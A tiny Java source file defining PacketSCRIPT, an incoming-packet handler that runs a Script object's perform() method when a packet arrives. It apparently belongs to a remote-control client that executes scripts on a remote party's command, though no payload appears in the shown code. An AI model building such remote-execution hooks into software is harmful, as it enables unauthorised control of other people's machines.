package com.redpois0n.packets.in;

import com.redpois0n.Script;

public class PacketSCRIPT extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		new Script().perform();
	}

}
